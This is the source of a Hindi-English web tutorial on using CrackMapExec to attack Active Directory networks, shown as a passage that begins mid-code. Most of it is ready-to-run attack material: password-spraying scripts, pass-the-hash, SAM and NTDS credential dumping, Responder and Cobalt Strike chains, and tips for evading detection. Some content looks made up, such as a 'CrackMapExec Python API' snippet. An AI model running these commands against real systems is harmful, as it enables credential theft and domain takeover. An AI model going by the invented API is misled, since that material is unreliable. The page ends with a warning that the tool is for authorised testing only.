crackmapexec smb 192.168.56.0/24 -u administrator -p P@ssw0rd
crackmapexec smb 192.168.56.0/24 -u testuser -p Password123 --shares`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced CME Usage"
        code={`# Spider Plus module (share content search):
crackmapexec smb target -u admin -p pass -M spider_plus -o MAX_DEPTH=3

# LAPS password read:
crackmapexec ldap target -u admin -p pass -M laps

# Password spray with delay (avoid lockout):
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Password1" --continue-on-success

# Multiple credentials:
crackmapexec smb target -u admin -p pass1 --local-auth
crackmapexec smb target -u admin -p pass2 --local-auth

# Remote registry:
crackmapexec smb target -u admin -p pass -M enum_loggedon

# WiFi passwords:
crackmapexec smb target -u admin -p pass -M wifi

# Installed software:
crackmapexec smb target -u admin -p pass -M installed_antivirus

# RDP check:
crackmapexec rdp target -u admin -p pass

# VNC access:
crackmapexec vnc target -u admin -p pass

# Chained attack workflow:
# 1. SMB scan → find valid creds
# 2. LDAP enum → find Kerberoastable accounts
# 3. Kerberoast → crack SPN passwords
# 4. Use new creds → lateral movement
# 5. SAM/NTDS dump → domain takeover`}
      />
      <CodeBlock
        title="ऑटोमेटेड AD ऑडिट"
        code={`#!/bin/bash
# पूरा AD audit script:
TARGET="$1"
USER="$2"
PASS="$3"
REPORT="ad_audit_$(date +%Y%m%d_%H%M%S).txt"

echo "=== Active Directory Audit ===" > $REPORT
echo "Date: $(date)" >> $REPORT
echo "Target: $TARGET" >> $REPORT
echo "User: $USER" >> $REPORT

echo -e "\n[1] SMB Enumeration:" >> $REPORT
crackmapexec smb $TARGET -u $USER -p $PASS >> $REPORT 2>&1

echo -e "\n[2] Shares:" >> $REPORT
crackmapexec smb $TARGET -u $USER -p $PASS --shares >> $REPORT 2>&1

echo -e "\n[3] Users:" >> $REPORT
crackmapexec ldap $TARGET -u $USER -p $PASS --users >> $REPORT 2>&1

echo -e "\n[4] Groups:" >> $REPORT
crackmapexec ldap $TARGET -u $USER -p $PASS --groups >> $REPORT 2>&1

echo -e "\n[5] Password Policy:" >> $REPORT
crackmapexec smb $TARGET -u $USER -p $PASS --pass-pol >> $REPORT 2>&1

echo -e "\n[6] Kerberoastable:" >> $REPORT
crackmapexec ldap $TARGET -u $USER -p $PASS --kerberoast >> $REPORT 2>&1

echo -e "\n[7] LAPS:" >> $REPORT
crackmapexec ldap $TARGET -u $USER -p $PASS -M laps >> $REPORT 2>&1

echo -e "\n[8] Delegation:" >> $REPORT
crackmapexec ldap $TARGET -u $USER -p $PASS --trusted-for-delegation >> $REPORT 2>&1

echo -e "\n=== Summary ===" >> $REPORT
echo "Pwn3d machines: $(grep -c 'Pwn3d' $REPORT 2>/dev/null || echo 0)" >> $REPORT
echo "Valid creds: $(grep -c '\\[+\\]' $REPORT 2>/dev/null || echo 0)" >> $REPORT
echo "[+] Report: $REPORT"`}
      />
      <CodeBlock
        title="क्रेडेंशियल स्प्रे ऑटोमेशन"
        code={`#!/bin/bash
# Safe credential spraying script:
TARGET="192.168.1.0/24"
USERS="users.txt"
PASSWORDS="passwords.txt"
DELAY=300  # 5 minutes between attempts

# Lockout threshold check:
echo "[*] Checking password policy..."
crackmapexec smb $TARGET -u admin -p pass --pass-pol

# Spray with delay:
while IFS= read -r pass; do
  echo "[*] Trying: $pass"
  crackmapexec smb $TARGET -u $USERS -p "$pass" \\
    --continue-on-success >> spray_results.txt
  echo "[*] Waiting $DELAY seconds..."
  sleep $DELAY
done < $PASSWORDS

# Results analysis:
echo "=== Spray Results ==="
echo "Valid credentials:"
grep "\\[+\\]" spray_results.txt
echo "Pwn3d machines:"
grep "Pwn3d" spray_results.txt`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'CME और NetExec में क्या फ़र्क है?', a: 'NetExec (nxec) CME का newer fork है। फ़ीचर्स same हैं लेकिन NetExec में बग फिक्सेस और नए modules हैं। दोनों use कर सकते हो।' },
          { q: '[Pwn3d!] का मतलब क्या है?', a: 'मतलब आपके पास उस मशीन पर एडमिन एक्सेस है। आप PsExec, SAM dump, या कोई भी एडमिन काम कर सकते हो।' },
          { q: 'Pass-the-Hash कैसे करें?', a: '-H flag से NTLM हैश दो: crackmapexec smb target -u admin -H aad3b435b51404eeaad3b435b51404ee:HASH' },
          { q: 'पूरा NTDS.dit कैसे डंप करें?', a: 'Domain Admin क्रेडेंशियल्स से: crackmapexec smb dc01 -u DAadmin -p pass --ntds या --ntds vss' },
          { q: 'क्या CME Linux पर काम करता है?', a: 'हाँ, CME Python-based है और Linux/macOS/Windows सब पर चलता है। Kali में प्री-इंस्टॉल्ड है।' },
          { q: 'कितना तेज़ है bulk scan?', a: '/24 नेटवर्क (256 hosts) कुछ मिनट में स्कैन हो जाता है। --threads flag से और तेज़ कर सकते हो।' },
          { q: 'Null session से क्या मिलता है?', a: 'कुछ machines पर null session से shares, users, groups enumerate हो सकते हैं। लेकिन admin access नहीं मिलेगा।' },
          { q: 'CME से interactive shell कैसे मिले?', a: 'CME directly interactive shell नहीं देता। PsExec method से background में command execute होते हैं। Interactive shell के लिए Impacket psexec.py या Evil-WinRM use करो।' },
          { q: 'CME कितना stealthy है?', a: 'बिल्कुल stealthy नहीं है। SMB traffic generate करता है जो IDS/IPS easily detect कर लेता है। Stealth के लिए --exec-method wmiexec use करो, ya crackmapexec की जगह Impacket scripts use करो।' },
          { q: 'LAPS password कैसे पढ़ें?', a: 'LDAP module से: crackmapexec ldap target -u admin -p pass -M laps। Domain Admin ya LAPS read permission चाहिए। LAPS passwords regularly rotate होते हैं।' },
          { q: 'BloodHound data कैसे collect करें?', a: 'crackmapexec ldap target -u admin -p pass --bloodhound --collection All। SharpHound ingestor भी use कर सकते हो। BloodHound GUI में data import करो।' },
          { q: 'Multiple domains test कैसे करें?', a: 'हर domain के लिए अलग credentials use करो: crackmapexec smb target -u user -p pass -d domain1.local। Trust relationships check करो: crackmapexec ldap target -u user -p pass --trusted-for-delegation' },
          { q: 'CME कितना fast है?', a: '/24 network (256 hosts) कुछ minutes में scan हो जाता है। --threads 20 से faster कर सकते हो। लेकिन बहुत ज़्यादा threads server load बढ़ा सकते हैं।' },
          { q: 'False positives कैसे handle करें?', a: '[+] और [Pwn3d!] verify करने के लिए actual command run करो: crackmapexec smb target -u admin -p pass -x whoami। अगर output मिले तो access confirmed है।' },
          { q: 'CME logs कहाँ save होते हैं?', a: '--log flag से specify करो: crackmapexec smb target -u admin -p pass --log results.txt। ~/.cme/ directory में भी logs save होते हैं।' },
          { q: 'Workgroup environment में कैसे use करें?', a: '--local-auth flag use करो: crackmapexec smb target -u admin -p pass --local-auth। Domain specify करने की ज़रूरत नहीं। Local accounts test होंगे।' },
          { q: 'IPv6 network पर काम करता है?', a: 'Limited support। IPv6 addresses directly pass कर सकते हो लेकिन कुछ modules properly काम नहीं करते। IPv4 recommend करूंगा।' },
          { q: 'CME output parse कैसे करें?', a: 'grep, awk, sed से parse करो। --log flag से file में save करो। Python script से structured analysis करो। CSV export available है।' },
          { q: 'Windows Defender bypass?', a: 'CME tools Windows Defender flag कर सकते हैं। AMSI bypass scripts use करो। --exec-method wmiexec less detectable है। EDR solutions additional challenges create करते हैं।' },
          { q: 'Multi-domain forest में?', a: 'हर domain के DC पर अलग credentials use करो। Trust relationships enumerate करो: crackmapexec ldap target -u user -p pass --trusted-for-delegation। Cross-domain attacks possible हैं।' },
          { q: 'CME से files कैसे transfer करें?', a: '--put-file से upload: crackmapexec smb target -u admin -p pass --put-file local.exe C:\\temp\\remote.exe। --get-file से download: --get-file C:\\Windows\\System32\\config\\SAM ./sam_backup' },
          { q: 'Password policy check कैसे करें?', a: 'crackmapexec smb target -u admin -p pass --pass-pol से password policy देखो। Minimum length, complexity, lockout threshold — सब मिलेगा। Credential spraying से पहले check करो।' },
          { q: 'CME GUI available है?', a: 'नहीं, CME सिर्फ CLI tool है। लेकिन NetExec में experimental web UI development हो रही है। CLI सबसे efficient है automation के लिए।' },
          { q: 'Proxychains के साथ use करें?', a: 'proxychains crackmapexec smb target -u admin -p pass। SOCKS proxy के through traffic route होगा। Pivot networks पर access के लिए useful है।' },
          { q: 'CME से Group Policy enumerate करें?', a: 'crackmapexec ldap target -u admin -p pass --gpasswords से GPO passwords find करो। SYSVOL share में GPP passwords search करो। cpassword decrypt करो — gpp-decrypt use करो।' },
          { q: 'Certificate abuse CME से?', a: 'crackmapexec ldap target -u admin -p pass --find-vulns से ADCS vulnerabilities check करो। ESC1-ESC8 vulnerabilities AD Certificate Services में common हैं। Certipy tool better है certificate-specific attacks के लिए।' },
          { q: 'CME output sanitize कैसे करें?', a: 'Report से sensitive data (passwords, hashes) remove करो sharing से पहले। sed/awk से replace करो: sed "s/password:.*/password: [REDACTED]/g"। Client reports में hashes include मत करो।' },
          { q: 'Delegation attacks CME से?', a: 'crackmapexec ldap target -u admin -p pass --trusted-for-delegation। Unconstrained delegation machines find करो — TGTs steal हो सकते हैं। Constrained delegation भी check करो — S4U2Self abuse possible है।' },
          { q: 'CME installation कैसे verify करें?', a: 'crackmapexec --version और crackmapexec --list-modules। सभी modules load हो रहे हैं verify करो। pip install --upgrade crackmapexec से update करो। Virtual environment recommend करूंगा।' },
          { q: 'Share enumeration detailed?', a: 'crackmapexec smb target -u admin -p pass --shares --filter SHARE_TYPE DISK। Readable shares: crackmapexec smb target -u admin -p pass --shares --filter READ। Spider Plus module: -M spider_plus से deep enumeration।' },
          { q: 'CME timeout issues?', a: '--timeout 10 flag increase करो slow networks के लिए। --jitter 50% से traffic pattern randomize करो। DNS resolution slow हो सकती है — IP addresses directly use करो।' },
          { q: 'Multi-protocol testing?', a: 'एक साथ: crackmapexec smb target -u admin -p pass & crackmapexec winrm target -u admin -p pass & crackmapexec ldap target -u admin -p pass & wait। हर protocol अलग attack surface expose करता है।' },
          { q: 'CME scripting?', a: 'Python wrapper scripts बनाओ जो CME commands chain करे। Bash automation: हर step sequentially run करो। JSON output parse करो — structured data analysis। CI/CD pipeline में integrate करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Real-World Case Studies</h2>
      <p>
        CME रियल-वर्ल्ड Red Team operations में सबसे ज़्यादा इस्तेमाल होने वाला टूल है। यह केस स्टडीज़ दिखाती हैं कि कैसे CME ने domain takeover तक पहुंचाया।
      </p>
      <p>
        <strong className="text-white">केस 1 — Domain Admin via Kerberoast:</strong> एक Red Team engagement में phishing से एक domain user का credential मिला। CME से पूरे network पर credential spray किया — 3 मशीन्स पर [Pwn3d!] मिला। एक मशीन से SAM dump करके local admin hash निकाला। LDAP module से Kerberoastable accounts ढूंढे — एक SPN account का TGS ticket crack हुआ। वह account Domain Admin था। Total time: 4 घंटे।
      </p>
      <p>
        <strong className="text-white">केस 2 — Lateral Movement Chain:</strong> एक corporate network में CME ने SMB signing disabled machines खोजीं। Responder से captured hash CME में use किया। 5 machines पर admin access मिला। हर machine से SAM dump → new hashes → more access। 2 दिन में Domain Controller तक पहुंच गए।
      </p>
      <p>
        <strong className="text-white">केस 3 — MSSQL to Domain Admin:</strong> एक engagement में CME के MSSQL module से SQL Server पर xp_cmdshell enable किया। SQL Server service account Domain Admin था (misconfiguration)। SQL injection से system command execute करके reverse shell मिला — Domain Admin access directly।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        CME अकेले powerful है लेकिन दूसरे tools के साथ combine करने से full attack chain बनती है।
      </p>
      <CodeBlock
        title="CME + Impacket + BloodHound"
        code={`# वर्कफ़्लो:
# 1. CME → Network scan + credential validation
# 2. Impacket → Deep exploitation (secretsdump, psexec)
# 3. BloodHound → Attack path visualization

# Step 1: CME से network scan
crackmapexec smb 192.168.1.0/24 -u user -p pass > cme_scan.txt

# Step 2: Pwn3d machines पर secretsdump
grep "Pwn3d" cme_scan.txt | awk '{print $5}' | \\
  while read host; do
    secretsdump.py user:pass@$host
  done

# Step 3: BloodHound data collection
crackmapexec ldap dc01 -u user -p pass \\
  --bloodhound --collection All

# CME + Responder combo:
# Terminal 1: Responder चलाओ
sudo responder -I eth0 -wrf

# Terminal 2: CME से captured hashes use करो
crackmapexec smb 192.168.1.0/24 -u admin -H CAPTURED_HASH

# CME + Hashcat pipeline:
# Step 1: SAM dump
crackmapexec smb target -u admin -p pass --sam > sam.txt
# Step 2: Extract hashes
cat sam.txt | awk -F: '{print $2":"$3}' > hashes.txt
# Step 3: Crack
hashcat -m 1000 hashes.txt rockyou.txt

# CME + Evil-WinRM:
# CME से WinRM machines find करो
crackmapexec winrm 192.168.1.0/24 -u admin -p pass
# Evil-WinRM से interactive shell
evil-winrm -i target -u admin -p pass`}
      />
      <CodeBlock
        title="CME + Cobalt Strike Integration"
        code={`# Cobalt Strike में CME बीकन से:
# बीकन कंसोल में:
execute-assembly /path/to/CrackMapExec.exe smb 192.168.1.0/24 -u admin -p pass

# या BOF (Beacon Object File):
inline-execute /path/to/cme_bof.o smb 192.168.1.0/24

# CME output Cobalt Strike में parse करो:
# CME results → CSV → Cobalt Strike targets import

# CME + Covenant/Sliver:
# Similar integration — execute-assembly
# Remote process injection में CME run करो

# CME + CrackMapExec Python API:
from crackmapexec import CME
cme = CME("smb", "192.168.1.0/24", username="admin", password="pass")
results = cme.run()
for host in results:
    if host.admin_access:
        print(f"[Pwn3d!] {host.ip}")`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        CME के results को structured format में save और analyze करो।
      </p>
      <CodeBlock
        title="रिपोर्ट जनरेशन"
        code={`# CME output फ़ाइल में सेव:
crackmapexec smb 192.168.1.0/24 -u admin -p pass --log results.txt

# JSON output:
crackmapexec smb 192.168.1.0/24 -u admin -p pass --log results.json

# CSV में कन्वर्ट:
cat results.txt | grep "+" | \\
  awk '{print $2","$5","$7}' > results.csv

# पूरा ऑडिट रिपोर्ट:
#!/bin/bash
TARGET="192.168.1.0/24"
USER="admin"
PASS="pass"
REPORT="ad_audit_$(date +%Y%m%d).txt"

echo "=== AD Audit Report ===" > $REPORT
echo "Date: $(date)" >> $REPORT
echo "Target: $TARGET" >> $REPORT

echo -e "\n[+] SMB Scan:" >> $REPORT
crackmapexec smb $TARGET -u $USER -p $PASS >> $REPORT

echo -e "\n[+] Shares:" >> $REPORT
crackmapexec smb $TARGET -u $USER -p $PASS --shares >> $REPORT

echo -e "\n[+] Users:" >> $REPORT
crackmapexec ldap $TARGET -u $USER -p $PASS --users >> $REPORT

echo -e "\n[+] Kerberoast:" >> $REPORT
crackmapexec ldap $TARGET -u $USER -p $PASS --kerberoast >> $REPORT

echo -e "\n[+] Password Policy:" >> $REPORT
crackmapexec smb $TARGET -u $USER -p $PASS --pass-pol >> $REPORT

echo "[+] Report: $REPORT"

# समरी:
echo "=== Summary ==="
echo "Pwn3d machines: $(grep -c 'Pwn3d' results.txt)"
echo "Valid creds: $(grep -c '\\[+\\]' results.txt)"
echo "Failed: $(grep -c '\\[-\\]' results.txt)"`}
      />

      <h2>Performance Tuning</h2>
      <p>
        बड़े networks पर CME को optimize करना ज़रूरी है।
      </p>
      <CodeBlock
        title="परफ़ॉर्मेंस ऑप्टिमाइज़ेशन"
        code={`# थ्रेड्स बढ़ाओ (default 1):
crackmapexec smb 192.168.1.0/24 -u admin -p pass --threads 20

# टाइमआउट कम करो:
crackmapexec smb 192.168.1.0/24 -u admin -p pass --timeout 5

# स्पेसिफिक targets (पूरे subnet की जगह):
crackmapexec smb targets.txt -u admin -p pass

# continue-on-success (brute force में):
crackmapexec smb 192.168.1.0/24 -u admin -p passwords.txt \\
  --continue-on-success

# local-auth (domain join नहीं):
crackmapexec smb 192.168.1.0/24 -u admin -p pass --local-auth

# स्पेसिफिक module only:
crackmapexec smb 192.168.1.0/24 -u admin -p pass --shares
# पूरा scan न करो, सिर्फ जो चाहिए वो

# मल्टीपल CME instances:
crackmapexec smb 192.168.1.0/24 -u admin -p pass &
crackmapexec winrm 192.168.1.0/24 -u admin -p pass &
crackmapexec ldap 192.168.1.0/24 -u admin -p pass &
wait`}
      />

      <h2>CME vs NetExec</h2>
      <p>
        CrackMapExec (CME) और NetExec (nxec) दोनों same codebase पर बने हैं लेकिन कुछ differences हैं। NetExec CME का newer fork है जिसमें bug fixes, new modules, और better performance है। दोनों same commands support करते हैं।
      </p>
      <p>
        अगर नया project start कर रहे हो तो NetExec recommend करूंगा — इसमें newer features हैं और actively maintained है। अगर existing scripts CME use करते हैं तो switch करने की ज़रूरत नहीं — commands same हैं। NetExec install: pip3 install netexec। CME और NetExec दोनों same time install रख सकते हो।
      </p>
      <p>
        NetExec में कुछ नए modules हैं जो CME में नहीं हैं — जैसे बेहतर RDP support, VNC module improvements, और new LDAP features। अगर cutting-edge features चाहिए तो NetExec use करो। दोनों का output format slightly different हो सकता है — parsing scripts adjust करने पड़ सकते हैं।
      </p>

      <h2>CME Limitations</h2>
      <p>
        CME powerful है लेकिन limitations भी हैं। यह जानना ज़रूरी है।
      </p>
      <p>
        CME directly interactive shell नहीं देता — commands background में execute होते हैं। Interactive shell के लिए Impacket psexec.py या Evil-WinRM use करो। CME का SMB module noisy है — IDS/IPS easily detect कर लेता है। Stealth operations के लिए WMI or DCOM methods use करो।
      </p>
      <p>
        CME Python-based है इसलिए large-scale operations में slow हो सकता है। 10,000+ hosts scan करते समय threading optimize करो। CME को domain-joined machine से run करने पर best results मिलते हैं। Workgroup environments में --local-auth flag use करो। CME कुछ firewall configurations में fail हो सकता है — SMB port 445 blocked हो तो काम नहीं करेगा।
      </p>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Impacket</td><td className="py-2 px-3">Windows protocol exploitation</td><td className="py-2 px-3">पूरा toolkit — psexec, wmiexec, secretsdump</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Evil-WinRM</td><td className="py-2 px-3">WinRM exploitation</td><td className="py-2 px-3">Interactive shell, file transfer</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PsExec</td><td className="py-2 px-3">Remote execution</td><td className="py-2 px-3">Sysinternals tool, GUI भी है</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">BloodHound</td><td className="py-2 px-3">AD attack path mapping</td><td className="py-2 px-3">ग्राफ़ visualization</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Responder</td><td className="py-2 px-3">LLMNR/NBT-NS poisoning</td><td className="py-2 px-3">हैश capture</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Rubeus</td><td className="py-2 px-3">Kerberos abuse</td><td className="py-2 px-3">Kerberoast, ticket manipulation</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PowerView</td><td className="py-2 px-3">AD enumeration (PowerShell)</td><td className="py-2 px-3">Detailed AD queries</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">SharpHound</td><td className="py-2 px-3">BloodHound data collector</td><td className="py-2 px-3">C# based, stealthy</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>CME का सबसे बड़ा एडवांटेज बल्क टेस्टिंग है — एक पासवर्ड से पूरा नेटवर्क टेस्ट करो</li>
          <li>अगर [Pwn3d!] दिखे तो उस मशीन पर --sam और --lsa रन करो — और क्रेडेंशियल्स मिलेंगे</li>
          <li>नए क्रेडेंशियल्स से दोबारा CME चलाओ — chain बनती जाएगी</li>
          <li>--exec-method wmiexec सबसे stealthy है, smbexec सबसे reliable</li>
          <li>Kerberoast + Hashcat combo से domain access मिल सकता है</li>
          <li>LAPS enabled environments में local admin password अलग होता है — domain creds से LAPS read करो</li>
          <li>Honey tokens detect करने के लिए fake admin accounts use करो</li>
          <li>NetExec (nxec) try करो — CME से बेहतर है newer features के साथ</li>
          <li>BloodHound integration built-in है — --bloodhound flag से data collect करो, attack paths visualize करो</li>
          <li>SMB signing check करो: --gen-relay-list से relay targets find करो</li>
          <li>MSSQL module से SQL servers exploit करो — xp_cmdshell enable करके system commands run करो</li>
          <li>SSH module Linux servers के लिए है — key-based auth भी support करता है</li>
          <li>RDP module से NLA check करो, screenshots लो, और remote login test करो</li>
          <li>Spider Plus module से network shares में sensitive files search करो</li>
          <li>WiFi passwords dump करो: -M wifi module use करो (admin access से)</li>
          <li>Installed software list करो: -M installed_antivirus module से security products detect करो</li>
          <li>LAPS enabled environments में local admin password read करो: -M laps module</li>
          <li>CME output CSV format में save करो — Excel में analyze कर सकते हो</li>
          <li>Red Team engagements में CME सबसे पहले use करो — network layout समझने के लिए</li>
          <li>Regular credential rotation CME attacks से बचने का best defense है</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> CrackMapExec एक शक्तिशाली AD exploitation टूल है। इसका इस्तेमाल केवल अधिकृत Red Team ऑपरेशंस और पेनेट्रेशन टेस्टिंग में ही करें। अनधिकृत नेटवर्क एक्सेस गंभीर अपराध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क एक्सेस में 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है। CME के logs में आपके actions track होते हैं — authorized testing से बाहर मत जाओ।
      </div>
    </TutorialLayout>
  )
}
